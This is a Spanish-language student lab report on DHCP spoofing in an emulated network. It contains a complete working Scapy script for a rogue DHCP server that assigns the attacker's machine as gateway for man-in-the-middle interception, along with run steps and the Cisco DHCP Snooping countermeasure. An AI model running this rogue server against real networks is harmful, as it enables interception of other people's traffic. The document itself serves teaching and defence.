# Ataque DHCP Spoofing
**Nombre:** Henry Vicente Quezada | **Matrícula:** 2025-1332 | **Fecha:** Junio 2026

---

## 🎬 Video Demostrativo
https://youtu.be/OdvQSLjWnXw?list=PLhmycmsx2nBtM_kPjpLdj-vl3sWWjShMS

---

## 1. Objetivo del Laboratorio
Demostrar cómo un atacante puede levantar un servidor DHCP falso para asignar configuraciones maliciosas a los clientes de la red, específicamente un gateway falso que redirija todo el tráfico por la máquina atacante, y aplicar DHCP Snooping como contramedida.

---

## 2. Objetivo del Script
Levantar un servidor DHCP falso que responda a solicitudes DHCP Discover y Request de los clientes, asignando la IP del atacante como gateway para realizar un ataque Man in the Middle.

### 2.1 Parámetros Usados
| Parámetro | Descripción | Valor |
|---|---|---|
| `interfaz` | Interfaz de red del atacante | Requerido (ej: `eth0`) |
| `FAKE_GATEWAY` | IP del gateway falso | `10.13.32.5` (Kali) |
| `FAKE_DNS` | DNS asignado a víctimas | `8.8.8.8` |
| `IP_POOL` | Rango de IPs a asignar | `10.13.32.50 - 10.13.32.80` |

### 2.2 Requisitos
- Sistema operativo: **Kali Linux**
- Python 3.x
- Librería Scapy: `pip install scapy`
- Permisos de root: `sudo`
- Conectividad en la misma red que las víctimas

---

## 3. Funcionamiento del Script
1. Escucha paquetes UDP en puertos 67 y 68 (DHCP)
2. Al recibir DHCP Discover responde con DHCP Offer con gateway falso
3. Al recibir DHCP Request responde con DHCP ACK confirmando la config maliciosa
4. Asigna IPs del pool definido a cada cliente por su MAC
5. El cliente recibe como gateway la IP de Kali en lugar de R1

```bash
Crear y guardar el script:
bash
nano /home/kali-linux/dhcp_spoofing.py

Pega el contenido del script, luego guarda con Ctrl+O → Enter → Ctrl+X

Dar permisos de ejecución:
bash
chmod +x /home/kali-linux/dhcp_spoofing.py

Pasos de ejecución
Paso 1 — VPC1: Ver IP actual antes del ataque
bash
show ip

Paso 2 — Kali: Ejecutar el ataque
bash
udo python3 /home/kali-linux/dhcp_spoofing.py eth0

Paso 3 — VPC1: Solicitar nueva IP
bash
ip dhcp
show ip

Gateway debe mostrar 10.13.32.5 ← IP de Kali ✅

Paso 4 — SW1: Aplicar contramedida
bash
conf t
ip dhcp snooping
ip dhcp snooping vlan 10
ip dhcp snooping vlan 20
no ip dhcp snooping information option
interface e0/0
 ip dhcp snooping trust
exit
end
write memory

Paso 5 — VPC1: Solicitar IP de nuevo
bash
ip dhcp
show ip

Gateway debe mostrar 10.13.32.1 ← R1 real ✅

Paso 6 — SW1: Verificar bloqueo
bash
show ip dhcp snooping statistics

Paso 7 — SW1: Limpiar configuración (entorno de laboratorio)
bash
conf t
no ip dhcp snooping
end
write memory

🐍 Script — dhcp_spoofing.py
python#!/usr/bin/env python3
# =============================================================
# Nombre:     Henry Vicente Quezada
# Matricula:  2025-1332
# Ataque:     DHCP Spoofing - Rogue Server
# Fecha:      2026
# =============================================================
from scapy.all import *
import sys

FAKE_GATEWAY   = "10.13.32.5"
FAKE_DNS       = "8.8.8.8"
SUBNET_MASK    = "255.255.255.0"
LEASE_TIME     = 86400
NETWORK_PREFIX = "10.13.32."

assigned_ips = {}
ip_counter   = 50

def get_next_ip():
    global ip_counter
    ip = NETWORK_PREFIX + str(ip_counter)
    ip_counter = ip_counter + 1 if ip_counter < 80 else 50
    return ip

def handle_dhcp(pkt, iface):
    if DHCP not in pkt:
        return
    dhcp_type = None
    for opt in pkt[DHCP].options:
        if opt[0] == 'message-type':
            dhcp_type = opt[1]
            break

    client_mac = pkt[Ether].src

    if dhcp_type == 1:
        offered_ip = assigned_ips.get(client_mac, get_next_ip())
        assigned_ips[client_mac] = offered_ip
        print(f"[+] Discover de {client_mac} -> {offered_ip}")
        offer = (
            Ether(src=get_if_hwaddr(iface), dst=client_mac) /
            IP(src=FAKE_GATEWAY, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, yiaddr=offered_ip, siaddr=FAKE_GATEWAY,
                  chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
            DHCP(options=[("message-type","offer"),("server_id",FAKE_GATEWAY),
                ("lease_time",LEASE_TIME),("subnet_mask",SUBNET_MASK),
                ("router",FAKE_GATEWAY),("name_server",FAKE_DNS),"end"])
        )
        sendp(offer, iface=iface, verbose=False)

    elif dhcp_type == 3:
        offered_ip = assigned_ips.get(client_mac, get_next_ip())
        print(f"[+] Request de {client_mac} -> ACK {offered_ip}")
        ack = (
            Ether(src=get_if_hwaddr(iface), dst=client_mac) /
            IP(src=FAKE_GATEWAY, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, yiaddr=offered_ip, siaddr=FAKE_GATEWAY,
                  chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
            DHCP(options=[("message-type","ack"),("server_id",FAKE_GATEWAY),
                ("lease_time",LEASE_TIME),("subnet_mask",SUBNET_MASK),
                ("router",FAKE_GATEWAY),("name_server",FAKE_DNS),"end"])
        )
        sendp(ack, iface=iface, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("\nUso: sudo python3 dhcp_spoofing.py <interfaz>")
        sys.exit(1)
    iface = sys.argv[1]
    print("=" * 55)
    print("       ATAQUE DHCP SPOOFING")
    print("       Autor: Henry Vicente Quezada")
    print("       Matricula: 2025-1332")
    print("=" * 55)
    print(f"[*] Gateway falso: {FAKE_GATEWAY}")
    print("[*] Esperando DHCP...\n")
    sniff(filter="udp and (port 67 or port 68)",
          prn=lambda p: handle_dhcp(p, iface),
          iface=iface, store=0)

🛡️ Contramedida aplicada

DHCP Snooping en SW1:
SW1(config)# ip dhcp snooping
SW1(config)# ip dhcp snooping vlan 10
SW1(config)# ip dhcp snooping vlan 20
SW1(config)# no ip dhcp snooping information option
SW1(config)# interface e0/0
SW1(config-if)# ip dhcp snooping trust
SW1(config)# end
SW1# write memory

! Verificación
SW1# show ip dhcp snooping statistics
SW1# show ip dhcp snooping binding

```
---

## 4. Documentación de la Red

### Topología
 
<img width="690" height="588" alt="image" src="https://github.com/user-attachments/assets/7211fbad-993b-4fed-bf0f-feb261dfbed9" />

### Tabla de Direccionamiento
| Dispositivo | Interfaz | VLAN | IP | Máscara | Rol |
|---|---|---|---|---|---|
| R1 | e0/0.10 | 10 | 10.13.32.1 | /24 | Gateway legítimo VLAN10 |
| R1 | e0/0.20 | 20 | 10.13.33.1 | /24 | Gateway VLAN20 |
| R1 | e0/0.99 | 99 | 10.13.99.1 | /24 | Gateway Management |
| SW1 | vlan 99 | 99 | 10.13.99.2 | /24 | Gestión Switch |
| VPC10 | eth0 | 10 | DHCP | /24 | **Víctima** |
| VPC20 | eth0 | 20 | DHCP | /24 | Cliente VLAN20 |
| Kali | eth0 | 10 | 10.13.32.5 | /24 | **Atacante / DHCP Falso** |

### Interfaces SW1
| Puerto | Modo | VLAN | Conectado a |
|---|---|---|---|
| e0/0 | Trunk 802.1q | 10,20,99 | R1 |
| e0/1 | Access | 10 | VPC10 |
| e0/2 | Access | 20 | VPC20 |
| e0/3 | Access | 10 | **Kali Linux** |

---

## 5. Capturas de Pantalla

### Antes del ataque
<img width="598" height="294" alt="image" src="https://github.com/user-attachments/assets/1b62a1e6-8185-44cd-83dd-04fe096e8752" />

> 📷 `VPC10# show ip` — gateway legítimo `10.13.32.1`

### Script en ejecución
<img width="635" height="409" alt="image" src="https://github.com/user-attachments/assets/4fbcd9db-55ec-46fb-8cdb-47fe6ca1d72b" />

> 📷 Kali ejecutando `dhcp_spoofing.py` esperando solicitudes DHCP

### Durante el ataque
<img width="634" height="440" alt="image" src="https://github.com/user-attachments/assets/2032d8a3-82b2-49b4-95e8-6a28be57f534" />

> 📷 `VPC10# show ip` — gateway falso `10.13.32.5` (Kali)

### Contramedida aplicada
<img width="717" height="497" alt="image" src="https://github.com/user-attachments/assets/85a4e89a-c97c-484d-a01c-25d7b02aae4b" />

> 📷 `SW1# show ip dhcp snooping statistics` — paquetes bloqueados

```

DHCP Snooping marca los puertos como trust o untrust. Solo los puertos trust pueden enviar respuestas DHCP. El puerto e0/0 hacia R1 se marca trust. El puerto e0/3 de Kali queda untrust y sus respuestas DHCP son descartadas automáticamente.
